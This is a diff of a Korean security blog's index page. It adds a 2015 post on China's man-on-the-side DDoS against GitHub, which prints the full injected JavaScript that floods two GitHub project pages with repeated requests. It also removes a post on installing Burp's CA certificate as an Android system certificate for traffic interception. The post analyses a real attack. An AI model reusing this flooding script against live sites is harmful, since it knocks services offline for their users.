@@ -9,21 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="코드로 돌려보기 (a,b) 가 서로소일 확률은 어떻게 될까? 일단 프로그램으로 돌려보니 대략 60% ~ 61% 가 나온다. 1 은 계산에서 제외하였다. 1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-def gcd(a,b): while b: a,b = b, &hellip;">
+  <meta name="description" content="NETRESEC 블로그에 올라온 글. 중국이 GitHub 에 정치적인 목적으로 DDoS 를 가했다고.
+중국정부인지 해커인지는 모르겠지만 China Unicom 에 설치된 packet injector 에서 baidu 에서 호스팅하는 web analytics 의 js 를 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -79,6 +66,124 @@ def gcd(a,b): while b: a,b = b, &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/04/06/chinas-man-on-the-side-attack-on-github/">China's Man-on-the-Side Attack on GitHub</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-04-06T17:08:17+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:08 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>NETRESEC 블로그에 올라온 글. 중국이 GitHub 에 정치적인 목적으로 DDoS 를 가했다고.
+중국정부인지 해커인지는 모르겠지만 China Unicom 에 설치된 packet injector 에서 baidu 에서 호스팅하는 web analytics 의 js 를 요청하는 http 를 hijack 해서 ddos 를 가하는 js 를 인젝트했다고 한다.</p>
+
+<p><code>2E3 == 2000</code> 이니까 2 초마다 <code>https://github.com/greatfire</code> 와 <code>https://github.com/cn-nytimes</code> 중에 하나를 골라서 AJAX 로 request 한다.</p>
+
+<ul>
+<li><a href="http://www.netresec.com/?page=Blog&amp;month=2015-03&amp;post=China%27s-Man-on-the-Side-Attack-on-GitHub">NETRESEC Blog</a></li>
+</ul>
+
+
+<figure class='code'><figcaption><span>인젝트된 코드</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;script src=&#39;http://libs.baidu.com/jquery/2.0.0/jquery.min.js&#39;&gt;\x3c/script&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">jQuery</span> <span class="o">&amp;&amp;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;script src=&#39;http://code.jquery.com/jquery-latest.js&#39;&gt;\x3c/script&gt;&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nx">startime</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">).</span><span class="nx">getTime</span><span class="p">();</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">unixtime</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">return</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">UTC</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">getFullYear</span><span class="p">(),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">getMonth</span><span class="p">(),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">getDay</span><span class="p">(),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">getHours</span><span class="p">(),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">getMinutes</span><span class="p">(),</span> <span class="nx">a</span><span class="p">.</span><span class="nx">getSeconds</span><span class="p">())</span> <span class="o">/</span> <span class="mi">1</span><span class="nx">E3</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="nx">url_array</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;https://github.com/greatfire&quot;</span><span class="p">,</span> <span class="s2">&quot;https://github.com/cn-nytimes&quot;</span><span class="p">];</span>
+</span><span class='line'><span class="nx">NUM</span> <span class="o">=</span> <span class="nx">url_array</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">r_send2</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">unixtime</span><span class="p">()</span> <span class="o">%</span> <span class="nx">NUM</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">get</span><span class="p">(</span><span class="nx">url_array</span><span class="p">[</span><span class="nx">a</span><span class="p">])</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">get</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span><span class='line'>        <span class="nx">url</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&quot;script&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">timeout</span><span class="o">:</span> <span class="mi">1</span><span class="nx">E4</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">cache</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
+</span><span class='line'>        <span class="nx">beforeSend</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">requestTime</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">).</span><span class="nx">getTime</span><span class="p">()</span>
+</span><span class='line'>        <span class="p">},</span>
+</span><span class='line'>        <span class="nx">complete</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">responseTime</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">).</span><span class="nx">getTime</span><span class="p">();</span>
+</span><span class='line'>            <span class="nx">b</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">responseTime</span> <span class="o">-</span> <span class="nx">requestTime</span><span class="p">);</span>
+</span><span class='line'>            <span class="mi">3</span><span class="nx">E5</span> <span class="o">&gt;</span> <span class="nx">responseTime</span> <span class="o">-</span> <span class="nx">startime</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">r_send</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span> <span class="nx">count</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>    <span class="p">})</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">function</span> <span class="nx">r_send</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">setTimeout</span><span class="p">(</span><span class="s2">&quot;r_send2()&quot;</span><span class="p">,</span> <span class="nx">a</span><span class="p">)</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="nx">setTimeout</span><span class="p">(</span><span class="s2">&quot;r_send2()&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="nx">E3</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2619,74 +2724,6 @@ $5 = (ListElement *) 0x7fffffffdc30
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/11/12/how-to-import-burps-ca-certificate-into-android-devices/">How to Import Burp's CA Certificate Into Android Devices</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-11-12T16:51:43+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>4:51 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>Burp</h4>
-
-<p>Burp 를 띄우고,</p>
-
-<p>Proxy -> Options -> CA Certificate -> Certificate in DER format -> Next -> Select File -> burp.der -> Save -> Next -> Close</p>
-
-<p>이렇게 해서 PortSwigger CA 인증서를 export 한다.</p>
-
-<p>이제</p>
-
-<p>DER 인코딩을 PEM 으로 바꾼 인증서를 하나 만든다.</p>
-
-<p>$ openssl x509 -inform DER -in burp.der -out burp.crt</p>
-
-<p>이제 hash 를 얻는다.</p>
-
-<p>$ openssl x509 -inform PEM -subject_hash_old -in burp.crt | head -1
-9a5ba575</p>
-
-<p>이제 안드로이드 포맷에 맞게 맞춰준다.</p>
-
-<pre><code>$ cat burp.crt &gt; 9a5ba575.0
-$ openssl x509 -inform PEM -text -in burp.crt -out /dev/null &gt;&gt; 9a5ba575.0
-</code></pre>
-
-<p>안드로이드로 옮긴다.</p>
-
-<pre><code>$ adb push 9a5ba575.0 /sdcard/
-$ adb shell
-# mount -o remount,rw /system
-# cp /sdcard/9a5ba575.0 /system/etc/security/cacerts/
-# chmod 644 /system/etc/security/cacerts/9a5ba575.0
-</code></pre>
-
-<h4>참고</h4>
-
-<ul>
-<li><a href="http://wiki.pcprobleemloos.nl/android/cacert">Installing CAcert certificates on Android as &lsquo;system&rsquo; credentials without lockscreen</a></li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/11">&larr; Older</a>
@@ -2704,6 +2741,10 @@ $ adb shell
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
       </li>
     
@@ -2717,10 +2758,6 @@ $ adb shell
     
       <li class="post">
         <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
       </li>
     
   </ul>
